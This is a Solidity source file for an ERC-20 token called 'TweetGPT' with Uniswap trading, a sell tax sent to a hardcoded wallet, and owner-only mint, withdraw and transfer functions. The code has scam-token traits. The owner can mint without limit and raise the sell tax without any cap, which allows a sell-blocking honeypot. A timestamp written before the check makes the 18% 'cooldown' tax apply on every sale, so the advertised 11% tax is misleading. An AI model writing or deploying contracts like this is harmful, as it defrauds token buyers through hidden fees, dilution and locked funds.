// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/security/Pausable.sol";

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}


contract TweetGPT is ERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    mapping(address => bool) private pairs;
    mapping(address => uint256) private _purchases;

    uint8 private constant _decimals = 9;
    bool private inSwap = false;
    bool private tradingOpen = false;
    address public uniswapV2Pair;
    address private _feeAddress = address(0xcDC95BF003A3738534Fe78509026066e0dEDc52d);
    uint256 public _tax = 110;
    uint256 public _coldownTax = 180;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (string memory _name, string memory _symbol, uint256 _initialSupply) ERC20(_name, _symbol) {
        _mint(msg.sender, _initialSupply);
    }

    function decimals() public override pure returns (uint8) {
        return _decimals;
    }

    function setFeeAddress(address _fee) external onlyOwner {
        _feeAddress = _fee;
    }

    function setTax(uint tax) external onlyOwner {
        _tax = tax;
    }

    function mint(address _to, uint256 _amount) public onlyOwner {
        _mint(_to, _amount);
    }

    function addPairs(address toPair, bool _enable) public onlyOwner {
        require(!pairs[toPair], "This pair is already excluded");

        pairs[toPair] = _enable;
    }

    function pair(address _pair) public view virtual onlyOwner returns (bool) {
        return pairs[_pair];
    }

    function _transfer(address from, address to, uint256 amount) internal virtual override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = balanceOf(from);
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        uint256 finalAmount = amount;
        _purchases[from] = block.timestamp;
         if(from != address(this) && pairs[to]) {
            uint256 taxAmount = amount.mul(_tax).div(10**3);
            if(_purchases[from] + 3 minutes > block.timestamp) {
                taxAmount = amount.mul(_coldownTax).div(10**3);
            }

            if(taxAmount > 0) {
                super._transfer(from, _feeAddress, taxAmount);
            }

            finalAmount = amount.sub(taxAmount);
        }
        super._transfer(from, to, finalAmount);
    }

    function manualswap() external onlyOwner {
        uint256 contractBalance = balanceOf(address(this));
        swapTokensForEth(contractBalance);
    }

    function manualBurn(uint256 amount) public virtual onlyOwner {
        _burn(address(this), amount);
    }
    
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen, "Trading is already open");
        _approve(address(this), address(uniswapV2Router), balanceOf(address(this)));
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        tradingOpen = true;
        pairs[uniswapV2Pair] = true;
    }

    function withdraw(address payable _to, uint _amount) public onlyOwner {
        uint amount = address(this).balance;
        require(amount >= _amount, "Insufficient balance");
        (bool success, ) = _to.call {
            value: _amount
        }("");

        require(success, "Failed to send balance");
    }

    function transferNFT(address _token, address[] memory _tos, uint256[] memory _tokenIds) public onlyOwner {
        for (uint8 i = 0; i < _tos.length; i++) {
          IERC721(_token).safeTransferFrom(address(this), _tos[i], _tokenIds[i]);
        }
    }

    function transferToken(address _token, address _to, uint _amount) public onlyOwner {
        ERC20(_token).transfer(_to, _amount);
    }

    receive() external payable {}
}